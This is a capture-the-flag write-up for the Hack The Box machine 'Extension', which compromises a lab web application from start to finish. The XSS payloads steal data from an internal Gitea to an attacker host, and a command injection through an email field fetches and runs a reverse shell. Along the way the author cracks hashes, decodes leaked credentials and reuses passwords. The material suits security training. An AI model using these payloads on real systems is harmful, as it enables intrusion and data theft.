---
layout: single
title: Extension - Hack The Box
excerpt: "Extensionis a hard-rated Linux machine from Hack The Box. This is a very interesting machine that's beautifully made, the attack surface is slim and there are a lot of rabbit holes to waste time on. Looking back on each vulnerability they all seem easy, but finding them all took a lot of time and effort - I think I spent around 25 hours in total on this box. Even though it took a lot of time, I really enjoyed it - especially the XSS part as it showcases the real dangers of XSS. I did learn a lot from this machine and I deeply recommend it to anyone!"
date: 2022-09-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-extension/extension_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
  unreleased: true
categories:
  - hackthebox
tags:  
  - linux
  - hard
  - web
  - fuzzing
  - tampering
  - xss
  - fetch
  - tunneling
  - shell_exec
  - docker sock
---

![](/assets/images/htb-writeup-extension/extension_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

Extensionis a hard-rated Linux machine from Hack The Box. This is a very interesting machine that's beautifully made, the attack surface is slim and there are a lot of rabbit holes to waste time on. Looking back on each vulnerability they all seem easy, but finding them all took a lot of time and effort - I think I spent around 25 hours in total on this box. Even though it took a lot of time, I really enjoyed it - especially the XSS part as it showcases the real dangers of XSS. I did learn a lot from this machine and I deeply recommend it to anyone!

----------------

# USER
### Step 1
```bash
➜  extension nmap -Pn -n -p- 10.10.11.171 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-07 15:49 CEST
Nmap scan report for 10.10.11.171
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

➜  extension nmap -Pn -n -p22,80 -sCV 10.10.11.171 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 82:21:e2:a5:82:4d:df:3f:99:db:3e:d9:b3:26:52:86 (RSA)
|   256 91:3a:b2:92:2b:63:7d:91:f1:58:2b:1b:54:f9:70:3c (ECDSA)
|_  256 65:20:39:2b:a7:3b:33:e5:ed:49:a9:ac:ea:01:bd:37 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: snippet.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Note the title - **snippet.htb**, add it to `/etc/hosts`

```bash
➜  extension ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://snippet.htb -H "Host: FUZZ.snippet.htb" -fw 1022
dev                     [Status: 200, Size: 12822, Words: 1029, Lines: 250, Duration: 33ms]
mail                    [Status: 200, Size: 5311, Words: 364, Lines: 97, Duration: 750ms]
```

- We find 2 vhosts using `fuff`, add them to `/etc/hosts`

```bash
➜  webanalyze ./webanalyze -host http://snippet.htb
http://snippet.htb (0.4s):
    Google Font API,  (Font scripts)
    Ubuntu,  (Operating systems)
    Nginx, 1.14.0 (Web servers, Reverse proxies)

➜  webanalyze ./webanalyze -host http://dev.snippet.htb
http://dev.snippet.htb (0.3s):
    Nginx, 1.14.0 (Web servers, Reverse proxies)
    Ubuntu,  (Operating systems)
    Gitea,  (Development)
    
➜  webanalyze ./webanalyze -host http://mail.snippet.htb
http://mail.snippet.htb (0.2s):
    Bootstrap,  (UI frameworks)
    RoundCube,  (Webmail)
    PHP,  (Programming languages)
    Nginx, 1.14.0 (Web servers, Reverse proxies)
    Ubuntu,  (Operating systems)
    PHP, 7.4.27 (Programming languages)

```

We have a lot to cover here, but lets start with the standard `snippet.htb`.

Looking on the webpage we find three potential users at the bottom of the frontpage - _Charlie Rooper_, _Jean Castux_ and _Thierry Halliday_. It could be a good idea to add these to a file and use [`namemash.py`](https://gist.github.com/christophetd/ff5237a439c20c629acc82afc9886f24) to find potential usernames. 

Pressing the big _"Get started"_ button takes us to `/login` where `{}` is written above the login form for some reason. I remember when checking a HTB Tournament way back, the creators wrote `{}` in the http-title to hint that there should be SSTI on that particular page - maybe that's the case here as well? Or I might just overanalyze and `{}` is logo for _snippet_. 

The symbols appear on all browsable sites; `/login`, `/forgot-password` and `register`.

![](/assets/images/htb-writeup-extension/extension01.png)

Looking on `/forgot-password` it seems like we can enumerate users, a invalid user will provide the error message _"no valid recipients"_ while a valid user will return _"We have emailed you password reset link!"_.

![](/assets/images/htb-writeup-extension/extension02.png)

![](/assets/images/htb-writeup-extension/extension03.png)

We can confirm that both `charlie@snippet.htb` and `jean@snippet.htb` are valid users, however `thierry@snippet.htb` is **not**. Trying a bunch of different authentication bypass techniques with username `charlie@snippet.htb` locks the account for 60 seconds, so that's not the way to go. 

Trying to register a new account we're met with the error _"Registration not allowed at this moment!"_, could it be that they disabled the feature as it's vulnerable, or is it just a rabbit hole? 

Playing around with the registration feature in Burp Suite I find nothing of use, lets leave it for now.

```bash
➜  extension ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://snippet.htb/FUZZ
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 51ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 57ms]
cgi-bin/                [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 30ms]
css                     [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 35ms]
dashboard               [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1775ms]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
forgot-password         [Status: 200, Size: 37782, Words: 1022, Lines: 30, Duration: 1492ms]
images                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 670ms]
js                      [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 29ms]
login                   [Status: 200, Size: 37797, Words: 1022, Lines: 30, Duration: 1672ms]
logout                  [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 2580ms]
new                     [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1189ms]
register                [Status: 200, Size: 37745, Words: 1022, Lines: 30, Duration: 1096ms]
reset-password          [Status: 405, Size: 825, Words: 132, Lines: 23, Duration: 1891ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 30ms]
snippets                [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1311ms]
users                   [Status: 302, Size: 342, Words: 60, Lines: 12, Duration: 1633ms]
```

Trying to fuzz anything after `/snippets` all return 302's, while testing both `/users` and `/dashboard` we get 404's. However I find nothing more. Looking at the source code of `index.php` we find this huge script block which starts with all (?) functions on the site, including some we haven't found yet.

```javascript
const Ziggy = {
    "url": "http:\/\/snippet.htb",
    "port": null,
    "defaults": {},
    "routes": {
    [... snip ...]
        "users": {
            "uri": "users",
            "methods": ["GET", "HEAD"]
        },
    [... snip ...]
        "snippets.update": {
            "uri": "snippets\/update\/{id}",
            "methods": ["GET", "HEAD"]
        },
        "api.snippets.update": {
            "uri": "snippets\/update\/{id}",
            "methods": ["POST"]
        },
        "api.snippets.delete": {
            "uri": "snippets\/delete\/{id}",
            "methods": ["DELETE"]
        },
        "snippets.new": {
            "uri": "new",
            "methods": ["GET", "HEAD"]
        },
        "users.validate": {
            "uri": "management\/validate",
            "methods": ["POST"]
        },
        "admin.management.dump": {
            "uri": "management\/dump",
            "methods": ["POST"]
```

Funtion `admin.management.dump` seems very interesting, we can only reach it through POST so we have to play around with cURL / fuff / Burp.

Here I was stuck for a while trying to fuzz the data object, I know that I need to include the **Cookie-**, **X-XSRF-TOKEN**- and **Content-type** headers, but when it comes to the data object I am clueless. After fuzzing the key and filtering with Burp I finally managed to find something:

**Request:**

![](/assets/images/htb-writeup-extension/extension04.png)

**Response:**

![](/assets/images/htb-writeup-extension/extension05.png)

The key **download** returns _"Unknown tablename"_ while all other keys return _"Missing arguments"_, we've got something! 
Lets continue to fuzz the value field and we quickly find the variable _users_, from which we extract 800+ users with their password hash.

![](/assets/images/htb-writeup-extension/extension06.png)


### Step 2
Copy all json data to file and format it using `json.tool`:
```bash
➜  extension python3 -m json.tool temp_download_users.json > snippet_users.json
```

Looking for high value targets we find that `Charlie` is the only _manager_ on the site:
```bash
➜  extension cat snippet_users.json | grep -B10 Manager
[
    {
        "id": 1,
        "name": "Charlie Rooper",
        "email": "charlie@snippet.htb",
        "email_verified_at": "2022-01-02 20:12:46",
        "password": "30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82",
        "remember_token": "T8hTcYuS7ULTi73eYg7ZHhncyNucDKQb3VaUDfcotdEGaDESr3YsP9xUlJEQ",
        "created_at": "2022-01-02 20:12:47",
        "updated_at": "2022-06-20 14:46:28",
        "user_type": "Manager"
```

Jean that we also found earlier is a member, her hash/token/information might come in handy later on.
```bash
➜  extension cat snippet_users.json | grep -a10 jean
    {
        "id": 664,
        "name": "Jean Castux",
        "email": "jean@snippet.htb",
        "email_verified_at": "2022-01-02 20:15:30",
        "password": "7f13a99efb779ebbe57cbca71dfac6334dd7e3e6345a353d74912e9843f918b6",
        "remember_token": "naXzYffXKP",
        "created_at": "2022-01-02 20:15:37",
        "updated_at": "2022-01-02 20:15:37",
        "user_type": "Member"
    },
```

Trying to crack all hashes we only get one hit:
```bash
➜  extension grep password snippet_users.json | awk -F\" '{print $4}' > tmp_hashes
➜  extension grep 'email"' snippet_users.json | awk -F\" '{print $4}' > tmp_email
➜  extension paste -d ":" tmp_email tmp_hashes > snippet_users.hash

➜  extension hashcat -a0 -m1400 snippet_users.hash /usr/share/wordlists/rockyou.txt --user
[... snip ...]
ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123

➜  extension hashcat -a0 -m1400 snippet_users.hash /usr/share/wordlists/rockyou.txt --user --show
letha@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
fredrick@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
gia@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
juliana@snippet.htb:ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123
```

Testing to login with credentials `letha@snippet.htb:password123` and we gain access to the application:

![](/assets/images/htb-writeup-extension/extension07.png)

Browsing snippets we find one public (``http://snippet.htb/snippets/1``) from _Isaac Heller_ named _"JavaScript get clipboard"_:
```js
function getClipBoard() {
    const el = document.createElement("div");
    document.body.appendChild(el);
    el.contentEditable = true;
    el.style = {position: 'absolute', left: '-9999px'};

    const range = document.createRange();
    range.selectNode(el);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);
    el.focus();
    document.execCommand("paste");
    return el.innerHTML;
}
```

Browsing to `http://snippet.htb/snippets/2` we find another snippet from **Jean** named _"Gitea API"_, however we're not authorized to view it.

### Step 3
The application is vulnerable to a pretty simple exploit where we utilize the edit function. 
Create a new snippet, the content is irrelevant, and head over to _Browse Snippets_. Press edit and _UPDATE_ without editing to capture the POST request in Burp.

The post body will look something like this:
```json
{"name":"sdf","content":"I only write in D","language":"D","public":true}
```

Now simply remove everything except `"public":true` and change the address from `/snippets/update/<id>` to `/snippets/update/2` to make Jean's snippet public. 

![](/assets/images/htb-writeup-extension/extension08.png)

Decode the token to reveal Jeans credentials:
```bash
➜  extension echo -n "amVhbjpFSG1mYXIxWTdwcEE5TzVUQUlYblluSnBB" | base64 -d
jean:EHmfar1Y7ppA9O5TAIXnYnJpA
```

With Jeans credentials we're now able to access her email (`mail.snippet.htb`) and git (`dev.snippet.htb`), however SSH only accepts publickey. 

Logging into git we find an extension designed display the body of issues posted on internal repos, meaning we can post data that will be read by other team members. 
Looking through the code (`inject.js`) we find this filter in the end:
```bash
function check(str) {
    // remove tags
    str = str.replace(/<.*?>/, "")

    const filter = [";", "\'", "(", ")", "src", "script", "&", "|", "[", "]"]

    for (const i of filter) {
        if (str.includes(i))
            return ""
    }
    return str
}
```

The first `<>` tag is replaced with `""`, this only happens once since it's not in a loop.
Other then that, a bunch of words and characters are also filtered. The big thing here is the semi-colon as it removes most of the "standard" ways to steal cookies.

To test if we can get this XSS to work, I use this simple payload and wait for callbacks.
`<replace-me><img sRc="http://10.10.14.10?c=hello.xss" />`

```
➜  extension python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.10 - - [08/Sep/2022 14:28:28] "GET /?c=hello.xss HTTP/1.1" 200 -
10.10.11.171 - - [08/Sep/2022 14:30:32] "GET /?c=hello.xss HTTP/1.1" 200 -
```

Now we just need to figure out what to steal, and how to do it. 


### Step 4
Here we have a few rules to follow, no parentheses and no semi colons. Googling around for _XSS without parentheses_ I come across [this gold mine](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md) or different XSS payloads. With a lot of trial and error and over 100+ tries later I finally succeed to find a payload that allows me to `fetch()` with my XSS:
```bash
## Payload to b64 encode
fetch('http://10.10.14.10/just-fetch')

## Issues body
<remove-me><img sRc="e" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9qdXN0LWZldGNoJykK`\x29"}`>

## HTTP Server
10.10.11.171 - - [09/Sep/2022 14:30:53] "GET /just-fetch HTTP/1.1" 404 -
```

Expanding on the PoC I try to fetch the content of text file that I host, and then fetch again to "send" the data base64 encoded in the URL.
```bash
➜  extension echo "fetch('http://10.10.14.10/employees.txt').then(response => response.text()).then(data => fetch('http://10.10.14.10/'+btoa(data)))" | base64
ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9lbXBsb3llZXMudHh0JykudGhlbihyZXNwb25zZSA9
PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjEw
LycrYnRvYShkYXRhKSkpCg==

## Issues body
<remove-me><img sRc="e" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC9lbXBsb3llZXMudHh0JykudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpLnRoZW4oZGF0YSA9PiBmZXRjaCgnaHR0cDovLzEwLjEwLjE0LjEwLycrYnRvYShkYXRhKSkpCg==`\x29"}`>

## HTTP Server
10.10.11.171 - - [09/Sep/2022 15:28:29] "GET /Q2hhcmxpZSBSb29wZXIKSmVhbiBDYXN0dXgKVGhpZXJyeSBIYWxsaWRheQo= HTTP/1.1" 404 -

➜  extension echo "Q2hhcmxpZSBSb29wZXIKSmVhbiBDYXN0dXgKVGhpZXJyeSBIYWxsaWRheQo=" | base64 -d
Charlie Rooper
Jean Castux
Thierry Halliday
```

We got a solid XSS PoC where we're able to exfiltrate data now we need to find a way to exploit this. Looking through the Gitea [API docs](http://dev.snippet.htb/api/swagger/) we have a lot of options, the first that comes to mind is _"GET /user"_ to show the authenticated user - in theory this should confirm what user is performing the XSS actions. To get a better understanding of the user performing my XSS calls lets see if we can extract any repo information using `http://dev.snippet.htb/api/v1/repos/search`. 

```bash
## Issues body
<remove-me><img sRc="e" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL3NlYXJjaCcpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"}`>

## HTTP Server
10.10.11.171 - - [10/Sep/2022 10:05:49] "GET /eyJvayI6 [... snip ...]

➜  extension echo "eyJvayI6 [... snip ...]" | base64 -d > tmp_repos.txt
➜  extension python3 -m json.tool tmp_repos.txt > xss_repos.json
➜  extension cat xss_repos.json 
{
    "ok": true,
    "data": [
        {
            "id": 2,
            "owner": {
				[... snip ...]
                "username": "charlie"
            },
            "name": "backups",
            "full_name": "charlie/backups",
            "description": "Backup of my home directory",
			[... snip ...]
            "html_url": "http://dev.snippet.htb/charlie/backups",
            "ssh_url": "git@localhost:charlie/backups.git",
            "clone_url": "http://dev.snippet.htb/charlie/backups.git",
			[... snip ...]
            "default_branch": "master",
			[... snip ...]
            "permissions": {
                "admin": true,
                "push": true,
                "pull": true
			[... snip ...]
```

This seems very promising, `charlie` have a repo of his home directory and within we'll hopefully find his `id_rsa`. Lets try to expand the XSS further to `fetch(http://dev.snippet.htb/charlie/backups)`. Trying this for a few times and we get no callbacks, maybe the response is to big resulting in an error and hence no callbacks. Lets try to go right for the money instead, we can assume that `id_rsa` should be at `http://dev.snippet.htb/charlie/backups/raw/branch/master/.ssh/id_rsa`.

```bash
10.10.11.171 - - [10/Sep/2022 10:27:30] "GET /Tm90IGZvdW5kLgo= HTTP/1.1" 404 -

➜  extension echo "Tm90IGZvdW5kLgo=" | base64 -d
Not found.
```

It is not..  nor is it directly at `http://dev.snippet.htb/charlie/backups/raw/branch/master/id_rsa`.. 
Instead of guessing blindly we can do a GET request to list the contents of the _backups_ repo:
```bash
## Issues body
<remove-me><img sRc="e" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9jb250ZW50cycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"}`>

## HTTP Server
10.10.11.171 - - [10/Sep/2022 11:28:09] "GET /W3sibmFtZSI6 [... snip ...]

➜  extension echo "W3sibmFtZSI6 [... snip ...]" | base64 -d > tmp_backups-content.txt
➜  extension python3 -m json.tool tmp_backups-content.txt > xss_repo-backups-content.json
➜  extension cat xss_repo-backups-content.json
[
    {
        "name": "backup.tar.gz",
        "path": "backup.tar.gz",
        "sha": "c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
        "type": "file",
        "size": 4316,
        "encoding": null,
        "content": null,
        "target": null,
        "url": "http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master",
        "html_url": "http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz",
        "git_url": "http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
        "download_url": "http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz",
        "submodule_git_url": null,
        "_links": {
            "self": "http://dev.snippet.htb/api/v1/repos/charlie/backups/contents/backup.tar.gz?ref=master",
            "git": "http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
            "html": "http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz"
        }
    }
]
```

We find a nice ``download_url`` go at it one last time and `fetch(http://dev.snippet.htb/charlie/backups/raw/branch/master/backup.tar.gz)`.
At this point I noticed a problem, the base64 created to download `backup.tar.gz` contained `+` signs and all payloads containing `+` had not worked - neither did this one..
So instead I aimed for `http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57` and thank god no `+` and we're able to extract the content.

```bash
## Issues body
<remove-me><img sRc="e" onerror=eval.call`${"eval\x28atob`ZmV0Y2goJ2h0dHA6Ly9kZXYuc25pcHBldC5odGIvYXBpL3YxL3JlcG9zL2NoYXJsaWUvYmFja3Vwcy9naXQvYmxvYnMvYzI1Y2I5ZDFmMWQ4M2JkYWQ0MWRhZDQwMzg3NGMyYzliOTFkMGI1NycpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGRhdGEgPT4gZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xMC8nK2J0b2EoZGF0YSkpKQo=`\x29"}`>

## HTTP Server
10.10.11.171 - - [10/Sep/2022 11:46:20] "GET /eyJjb250 [... snip ...]

➜  extension echo "eyJjb250 [... snip ...]" | base64 -d > tmp_backups.txt
➜  extension python3 -m json.tool tmp_backups.txt > xss_backups-blob.json
➜  extension cat xss_backups-blob.json
{
    "content": "H4sIANO61GEAA [... snip ...]",
    "encoding": "base64",
    "url": "http://dev.snippet.htb/api/v1/repos/charlie/backups/git/blobs/c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
    "sha": "c25cb9d1f1d83bdad41dad403874c2c9b91d0b57",
    "size": 4316
}

➜  extension echo "H4sIANO61GEAA [... snip ...]" | base64 -d > backups.tar.gz
➜  extension tar -xvf backups.tar.gz
home/charlie/
home/charlie/backups/
home/charlie/backups/backup.tar.gz
home/charlie/.profile
home/charlie/.bash_history
home/charlie/.bash_logout
home/charlie/.ssh/
home/charlie/.ssh/id_rsa
home/charlie/.ssh/id_rsa.pub
home/charlie/.bashrc

➜  .ssh ssh charlie@extension.htb -i id_rsa 
charlie@extension:~$ id && hostname
uid=1001(charlie) gid=1001(charlie) groups=1001(charlie)
extension

charlie@extension:~$ cat .git-credentials 
http://charlie:MqiereNBGq4DqSVYaC8nazMXzuYqFJ9WPnIZSIWz@dev.snippet.htb
```


### Step 5
User `charlie` doesn't have access to `user.txt`, we still need to pivot to `jean`. 
We noticed earlier that Jean used the same password for Git and Mail, trying to change user with `su jean` proves that she yet again use the same password.

```bash
charlie@extension:~$ su jean
Password: EHmfar1Y7ppA9O5TAIXnYnJpA

jean@extension:~$ id
uid=1000(jean) gid=1000(jean) groups=1000(jean)

jean@extension:~$ cat user.txt
5f1b4312834b32b832925f86933a700b
```


-----------------------
# ROOT
### Step 1
Checking the usual directories and commands for anomalies - `/`, `/opt`, `/tmp`, `/var/www`, `sudo -l`,  `ps aux`, `netstat -tulpn`

We find `/snap`, it's not very common for HTB boxes but this might be an exception as it's a Ubuntu host we're on. 

Interesting directories in **`/opt`:**
```bash
jean@extension:/opt$ ls -al
total 16
drwxr-xr-x  4 root root 4096 Jan  3  2022 .
drwxr-xr-x 24 root root 4096 Jun 24 14:57 ..
drwx--x--x  4 root root 4096 Jan  2  2022 containerd
drwxr-xr-x  4 root root 4096 Jan  3  2022 WebDriver
```

Mozilla profile in `/tmp`:
```bash
jean@extension:/tmp$ ls -al
[... snip ...]
drwxr-xr-x 13 root root 4096 Sep 10 11:05 rust_mozprofileI7joD3
```

However it only contains 3 of the 4 files needed (missing `logins.json`) and we cant't read `cert9.db` nor `key4.db`:
```
jean@extension:/tmp/rust_mozprofileI7joD3$ ls -al
total 16312
-rw-------  1 root root  229376 Sep 10 07:48 cert9.db
-rw-r--r--  1 root root  524288 Sep 10 11:05 cookies.sqlite
-rw-------  1 root root  294912 Sep 10 07:48 key4.db
```

A lot of new internal port:
```bash
jean@extension:/var/www$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:9000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:143           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                               
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43743         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:993           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41411         0.0.0.0:*               LISTEN      -    
```

Looking in the nginx config we can identify port 3000, 8000 and 8001:
```bash
jean@extension:/etc/nginx$ cat sites-available/default
[... snip ...]
server_name _;
	proxy_pass http://127.0.0.1:8001;
[... snip ...]
server_name mail.snippet.htb;
	proxy_pass http://127.0.0.1:8000;
[... snip ...]
server_name dev.snippet.htb;
	proxy_pass http://127.0.0.1:3000;
```


Copy over `pspy64` and see if there's anything executing behind the scenes:
```bash
charlie@extension:/dev/shm$ wget http://10.10.14.10/pspy64
charlie@extension:/dev/shm$ chmod +x pspy64
charlie@extension:/dev/shm$ ./pspy64
[... snip ...]
2022/09/11 13:15:01 CMD: UID=0    PID=8058   | sh -c mysql -u root -ptoor --database webapp --execute "delete from snippets where id > 2;"
2022/09/11 13:15:01 CMD: UID=0    PID=8065   | docker exec 2ee49381d443 sh -c mysql -u root -ptoor --database webapp --execute "UPDATE users set password='30ae5f5b247b30c0eaaa612463ba7408435d4db74eb164e77d84f1a227fa5f82' where email='charlie@snippet.htb';"
2022/09/11 13:15:01 CMD: UID=0    PID=8115   | sh -c mysql -u root -ptoor --database webapp --execute "UPDATE users set password='7f13a99efb779ebbe57cbca71dfac6334dd7e3e6345a353d74912e9843f918b6' where email='jean@snippet.htb';" 
```

We find credentials and database name for mysql - `root:toor`. Setup SSH tunnels and change one of the previous found accounts `user_type` from _Member_ to **Manager**: 
```bash
➜  .ssh ssh -N -f -L 3306:localhost:3306 charlie@extension.htb -i id_rsa
➜  extension mysql -h 127.0.0.1 -D webapp -u root -p

MySQL [webapp]> select * from users where email = 'juliana@snippet.htb';
+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+
| id  | name          | email               | email_verified_at   | password                                                         | remember_token                                               | created_at          | updated_at          | user_type |
+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+
| 701 | Juliana Thiel | juliana@snippet.htb | 2022-01-02 20:15:32 | ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f | ogRS7mYef6bK1KDFu0Svdm1C3AwnpBFhiWKRaMV92ubm4nmMmAIcoJRVhcUF | 2022-01-02 20:15:37 | 2022-06-20 11:46:35 | Member    |
+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+

MySQL [webapp]> update users set user_type = 'Manager' where users.id = 701;
Query OK, 1 row affected (0.034 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MySQL [webapp]> select * from users where email = 'juliana@snippet.htb';
+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+
| id  | name          | email               | email_verified_at   | password                                                         | remember_token                                               | created_at          | updated_at          | user_type |
+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+
| 701 | Juliana Thiel | juliana@snippet.htb | 2022-01-02 20:15:32 | ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f | ogRS7mYef6bK1KDFu0Svdm1C3AwnpBFhiWKRaMV92ubm4nmMmAIcoJRVhcUF | 2022-01-02 20:15:37 | 2022-06-20 11:46:35 | Manager   |
+-----+---------------+---------------------+---------------------+------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+-----------+
```


### Step 2
Logging in as `juliana@snippet.htb` it doesn't seem like anything special happened. The only new feature we have is to _"Show all"_ snippets, that including private ones:

![](/assets/images/htb-writeup-extension/extension09.png)

And this _"Validate"_ button for all the users:

![](/assets/images/htb-writeup-extension/extension10.png)

Pressing _Validate_ will send a post request to validate the email of the user, and we'll get the response _"Mail is valid!"_. 

Playing around in MySQL I tried to change email of _Kaleigh Lehner_ and noticed that entering `;`, `&` or `|` still registered as valid email. 
Instead of guessing I decide to look in to the source code to see how this function works and find this:
```php
jean@extension:~/projects/laravel-app/app/Http/Controllers$ cat AdminController.php
[... snip ...]
} else {
	$res = shell_exec("ping -c1 -W1 $domain > /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'");
	return Redirect::back()->with('message', trim($res));
}

```

The input data isn't sanitized since we can write directly into the MySQL database and from the vulnerable `shell_exec` function get command injection.

```bash
MySQL [webapp]> update users set email = "&id&" where users.id = 895;
Query OK, 1 row affected (0.035 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

Press _"VALIDATE"_ to execute command:

![](/assets/images/htb-writeup-extension/extension11.png)

Setup a reverse shell payload to get foothold on the docker container:
```bash
➜  extension echo "bash -i >& /dev/tcp/10.10.14.10/4488 0>&1" > rev.sh
➜  extension chmod +x rev.sh 
➜  extension python3 -m http.server 80

MySQL [webapp]> update users set email = "&wget -qO- http://10.10.14.10/rev.sh | bash&" where users.id = 895;
Query OK, 1 row affected (0.033 sec)
Rows matched: 1  Changed: 1  Warnings: 0

## PRESS 'VALIDATE'

10.10.11.171 - - [11/Sep/2022 18:31:18] "GET /rev.sh HTTP/1.1" 200 -

➜  extension nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.11.171] 53454
bash: cannot set terminal process group (46): Inappropriate ioctl for device
bash: no job control in this shell
application@4dae106254bf:/var/www/html/public$ id
uid=1000(application) gid=1000(application) groups=1000(application),999(app)
```


### Step 3
Upload `deepce.sh` and enumerate the container. 
```bash
application@4dae106254bf:/dev/shm$ wget http://10.10.14.10/deepce.sh
application@4dae106254bf:/dev/shm$ chmod +x deepce.sh
application@4dae106254bf:/dev/shm$ bash deepce.sh
[... snip ...]
[+] Dangerous Capabilities .. Yes
cap_dac_override

[... snip ...]
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... Yes
The docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md
```

